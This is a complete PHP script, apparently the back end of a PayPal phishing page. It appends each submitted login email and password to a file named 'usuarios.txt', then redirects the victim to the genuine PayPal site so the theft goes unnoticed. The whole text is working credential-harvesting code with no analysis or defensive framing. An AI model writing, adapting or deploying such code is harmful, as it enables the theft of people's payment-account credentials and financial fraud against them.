<?php

file_put_contents("usuarios.txt", "Paypal User:" . $_POST['login_email'] . " Password: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com');
exit();
?>
